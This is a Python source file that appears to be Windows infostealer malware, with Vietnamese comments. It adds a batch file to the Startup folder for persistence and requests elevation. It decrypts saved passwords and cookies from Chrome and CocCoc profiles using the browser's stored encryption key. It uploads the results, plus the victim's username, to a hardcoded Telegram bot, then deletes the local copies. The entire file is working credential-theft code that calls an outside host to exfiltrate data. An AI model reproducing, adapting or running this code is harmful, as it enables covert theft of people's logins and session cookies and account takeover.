
import threading
import os
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import requests
import json
from datetime import datetime
import getpass
import winreg
import sys
import shutil
import ctypes
user_login = getpass.getuser()


# TAO FILE .BAT KHOI DONG CUNG WINDOWS
def get_executable_dir():
    if getattr(sys, 'frozen', False):
        # Đang chạy trong môi trường đóng gói (file exe)
        return os.path.dirname(sys.executable)
    else:
        # Đang chạy trong môi trường nguồn Python
        return os.path.dirname(os.path.abspath(sys.argv[0]))

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_startup_bat():
    # Lấy đường dẫn của thư mục Startup
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Tạo tên tệp .bat từ tên của file exe hiện tại
    exe_name = os.path.splitext(os.path.basename(sys.argv[0]))[0]
    bat_file_name = f'run_{exe_name}.bat'

    # Lấy đường dẫn của file exe hiện tại
    executable_path = os.path.join(get_executable_dir(), f'{exe_name}.exe')

    # Tạo nội dung cho tệp .bat
    bat_content = f'''@echo off
:KIEMTRA
xem Kiểm tra kết nối mạng
ping -n 1 google.com >nul
if %errorlevel% neq 0 (
    echo Không có kết nối mạng. Đợi 10 giây và thử lại...
    timeout /t 10 /nobreak >nul
    goto KIEMTRA
)

rem Có kết nối mạng, tiếp tục chạy ứng dụng
echo Có kết nối mạng. Bắt đầu chạy ứng dụng...
start "" "{executable_path}"
exit /b
'''

    # Đường dẫn đầy đủ của tệp .bat trong thư mục Startup
    bat_file_path = os.path.join(startup_folder, bat_file_name)

    # Ghi nội dung vào tệp .bat với encoding utf-8-sig
    with open(bat_file_path, 'w', encoding='utf-8-sig') as bat_file:
        bat_file.write(bat_content)

    return bat_file_path

def run_bat_as_admin(bat_file_path):
    if is_admin():
        os.system(bat_file_path)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, bat_file_path, None, 1)

if __name__ == "__main__":
    bat_file_path = create_startup_bat()
    run_bat_as_admin(bat_file_path)
    
def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def get_encryption_key():
    local_state_path = None
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
        if local_state_path != None:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return None
    except:
        return None

def get_encryption_key_2():
    local_state_path = None
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "CocCoc", "Browser",
                                            "User Data", "Local State")
        if local_state_path != None:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return None
    except:
        return None

def craw_cookie():
    try:
        conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")
        conn.text_factory = lambda b: b.decode(errors = 'ignore')
        cookie=read_cookie_from_sqlite(conn)
        send_cookie(cookie,'_chrome_0')
    except:
        pass

    for i in range(0,1000):
        try:
            conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Profile "+str(i)+"\\Network\\Cookies")
            conn.text_factory = lambda b: b.decode(errors = 'ignore')
            cookie = read_cookie_from_sqlite(conn)
            send_cookie(cookie,'_chrome_'+str(i))
        except:
            pass
    try:
        conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Network\\Cookies")
        conn.text_factory = lambda b: b.decode(errors = 'ignore')
        cookie=read_cookie_from_sqlite_2(conn)
        send_cookie(cookie,'_coccoc_0')
    except:
        pass
    for i in range(0,1000):
        try:
            conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Profile "+str(i)+"\\Network\\Cookies")
            conn.text_factory = lambda b: b.decode(errors = 'ignore')
            cookie=read_cookie_from_sqlite_2(conn)
            send_cookie(cookie,'_coccoc_'+str(i))
        except:
            pass

def craw_password():
    try:
        conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        conn.text_factory = lambda b: b.decode(errors = 'ignore')
        password=read_password_from_sqlite(conn)
        send_password(password,'_chrome_0')
    except:
        pass
    for i in range(0,1000):
        try:
            conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Profile "+str(i)+"\\Login Data")
            conn.text_factory = lambda b: b.decode(errors = 'ignore')
            password = read_password_from_sqlite(conn)
            send_password(password,'_chrome_'+str(i))
        except:
            pass
    try:
        conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Login Data")
        conn.text_factory = lambda b: b.decode(errors = 'ignore')
        password=read_password_from_sqlite_2(conn)
        send_password(password,'_coccoc_0')
    except:
        pass
    for i in range(0,1000):
        try:
            conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Profile "+str(i)+"\\Login Data")
            conn.text_factory = lambda b: b.decode(errors = 'ignore')
            password=read_password_from_sqlite_2(conn)
            send_password(password,'_coccoc_'+str(i))
        except:
            pass

def read_cookie_from_sqlite(conn):
    list_cookie = ""
    if conn != None:
        with conn:
            cur = conn.cursor()
            cur.execute("SELECT host_key, has_expires, path, is_secure, expires_utc, name, encrypted_value FROM Cookies ORDER BY host_key")
            key = get_encryption_key()
            if key != None:
                host = ''
                for i in cur.fetchall():
                    if i[1] == 1:
                        exp = 'TRUE'
                    else:
                        exp = 'FALSE'
                    if i[3] == 1:
                        ser = 'TRUE'
                    else:
                        ser = 'FALSE'
                    decrypted_value = decrypt_data(i[6], key)
                    try:
                        list_cookie += i[0]+"\t"+exp+"\t"+i[2]+"\t"+ser+"\t"+str(i[4])+"\t"+i[5]+"\t"+decrypted_value+"\n"
                    except:
                        pass
                return list_cookie

def read_password_from_sqlite(conn):
    data = ''
    if conn != None:
        with conn:
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins  ORDER BY origin_url")
            key = get_encryption_key()
            if key != None:
                for i in cur.fetchall():
                    decrypted_value = decrypt_data(i[2], key)
                    data += 'URL: '+i[0]+'\nUsername: '+i[1]+'\nPassword: '+decrypted_value+'\n=====\n'
                return data
    return data

def read_cookie_from_sqlite_2(conn):
    list_cookie = ""
    if conn != None:
        with conn:
            cur = conn.cursor()
            cur.execute("SELECT host_key, has_expires, path, is_secure, expires_utc, name, encrypted_value FROM Cookies ORDER BY host_key")
            key = get_encryption_key_2()
            if key != None:
                host = ''
                for i in cur.fetchall():
                    if i[1] == 1:
                        exp = 'TRUE'
                    else:
                        exp = 'FALSE'
                    if i[3] == 1:
                        ser = 'TRUE'
                    else:
                        ser = 'FALSE'
                    decrypted_value = decrypt_data(i[6], key)
                    try:
                        list_cookie += i[0]+"\t"+exp+"\t"+i[2]+"\t"+ser+"\t"+str(i[4])+"\t"+i[5]+"\t"+decrypted_value+"\n"
                    except:
                        pass
                return list_cookie

def read_password_from_sqlite_2(conn):
    data = ''
    if conn != None:
        with conn:
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins  ORDER BY origin_url")
            key = get_encryption_key_2()
            if key != None:
                for i in cur.fetchall():
                    decrypted_value = decrypt_data(i[2], key)
                    data += 'URL: '+i[0]+'\nUsername: '+i[1]+'\nPassword: '+decrypted_value+'\n=====\n'
                return data
    return data






def send_message():
    apiToken = '6773631812:AAFcrzuxSG0FL2p87Ch9OKEikK-tSiB5ZXc'
    chatID = '-4052071772'
    url = f"https://api.telegram.org/bot{apiToken}/sendMessage?chat_id={chatID}&text={'User'+'_'+user_login}"
    requests.get(url).json()



def send_cookie(message,index):
    now = datetime.now()
    date_time = now.strftime("%d-%m-%Y, %H-%M-%S")
    index+='_'+user_login+'_'+index
    index+='_'+date_time
    f = open(f'cookie{index}.txt','a+',encoding='utf-8')
    f.write(message)
    f.close()
    apiToken = '6773631812:AAFcrzuxSG0FL2p87Ch9OKEikK-tSiB5ZXc'
    chatID = '-4052071772'
    # apiURL = f'https://api.telegram.org/bot{apiToken}/sendMessage'
    apiURL = "https://api.telegram.org/bot"+apiToken+"/sendDocument"
    payload={'chat_id': chatID}
    f = open(f'cookie{index}.txt','rb')
    files=[
        ('document',(f'cookie{index}.txt',f,'application/zip'))
      ]

    try:
        response = requests.post(apiURL,data =payload,files=files)
        f.close()
        f = open(f'cookie{index}.txt', 'w')
        f.close()
        os.remove(f'cookie{index}.txt')
    except Exception as e:
        pass

def send_password(message,index):
    now = datetime.now()
    date_time = now.strftime("%d-%m-%Y, %H-%M-%S")
    index+='_'+user_login+'_'+index
    index+='_'+date_time
    f = open(f'password{index}.txt','a+',encoding='utf-8')
    f.write(message)
    f.close()
    apiToken = '6773631812:AAFcrzuxSG0FL2p87Ch9OKEikK-tSiB5ZXc'
    chatID = '-4052071772'
    apiURL = "https://api.telegram.org/bot"+apiToken+"/sendDocument"
    payload={'chat_id': chatID}
    f = open(f'password{index}.txt','rb')
    files=[
        ('document',(f'password{index}.txt',f,'application/zip'))
      ]

    try:
        response = requests.post(apiURL,data =payload,files=files)
        f.close()
        f = open(f'password{index}.txt', 'w')
        f.close()
        os.remove(f'password{index}.txt')
    except Exception as e:
        pass

send_message()
craw_cookie()
craw_password()